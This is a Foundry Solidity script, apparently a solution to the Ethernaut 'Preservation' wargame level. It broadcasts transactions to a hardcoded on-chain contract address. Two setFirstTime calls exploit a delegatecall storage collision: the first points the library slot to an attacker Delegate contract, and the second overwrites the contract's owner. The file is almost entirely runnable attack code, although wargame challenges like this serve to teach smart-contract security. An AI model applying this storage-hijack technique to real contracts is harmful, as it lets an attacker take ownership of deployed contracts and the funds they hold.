// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";
import {Delegate} from "../src/Delegate.sol";
import {DeployScript} from "../script/DeployScript.s.sol";
import {LibraryContract} from "../src/Preservation.sol";

contract AttackScript is Script {

    Delegate intermediate;
    Preservation preservation;
    DeployScript deployScript;
    LibraryContract libraryContract1;
    LibraryContract libraryContract2;


    function run() public {

        // deployScript = new DeployScript();
        // (intermediate, preservation) = deployScript.run();

        vm.startBroadcast(); 
        
        // libraryContract1 = new LibraryContract();
        // libraryContract2 = new LibraryContract();


        // preservation = new Preservation(address(libraryContract1), address(libraryContract2));

        preservation = Preservation(Preservation(0x963ACd08563D83A75d58741254d394800A7DA4A7));
        
        // intermediate = new Delegate(preservation);
        
        intermediate = new Delegate(preservation);
        
        console2.log("Initial preservation.owner =", preservation.owner());
        console2.log("msg.sender =", msg.sender);
        console2.log("Initial timeZone1Library =", preservation.timeZone1Library());


        // Step 1: Overwrite timeZone1Library with address of attacker contract
        preservation.setFirstTime(uint256(uint160(address(intermediate))));

        // Step 2: Now that timeZone1Library points to Delegate, call setFirstTime again
        preservation.setFirstTime(uint256(uint160(0x5134FCA2Ce708AEf8672ffB6561288ee81E30543)));

        console2.log("preservation.owner =", preservation.owner());
        // console2.log("msg.sender =", msg.sender);

        vm.stopBroadcast();
   
    }
}

